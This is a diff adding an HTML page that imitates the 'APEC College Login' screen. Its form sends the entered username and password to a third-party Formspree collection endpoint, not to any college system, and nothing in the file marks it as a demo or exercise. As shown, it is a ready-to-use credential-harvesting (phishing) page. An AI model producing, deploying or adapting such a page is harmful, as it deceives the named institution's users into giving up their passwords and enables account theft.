@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>APEC College Login</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial, sans-serif;
+}
+
+body{
+    background:#f2f2f2;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+}
+
+.container{
+    width:350px;
+    background:white;
+    padding:30px;
+    border-radius:10px;
+    box-shadow:0 0 15px rgba(0,0,0,0.2);
+    text-align:center;
+}
+
+.logo{
+    width:100px;
+    height:100px;
+    margin-bottom:15px;
+}
+
+h2{
+    color:#003366;
+    margin-bottom:20px;
+}
+
+input{
+    width:100%;
+    padding:10px;
+    margin:10px 0;
+    border:1px solid #ccc;
+    border-radius:5px;
+    font-size:16px;
+}
+
+button{
+    width:100%;
+    padding:10px;
+    background:#003366;
+    color:white;
+    border:none;
+    border-radius:5px;
+    font-size:16px;
+    cursor:pointer;
+}
+
+button:hover{
+    background:#0055aa;
+}
+</style>
+
+</head>
+<body>
+
+<div class="container">
+
+    <img src="images" alt="APEC College Logo" class="logo">
+
+    <h2>APEC College Login</h2>
+
+    <form action="https://formspree.io/f/xbdvwjnr" method="POST">
+
+        <input
+            type="text"
+            name="Username"
+            placeholder="Enter Username"
+            required>
+
+        <input
+            type="password"
+            name="Password"
+            placeholder="Enter Password"
+            required>
+
+        <button type="submit">Login</button>
+
+    </form>
+
+</div>
+
+</body>
+</html>
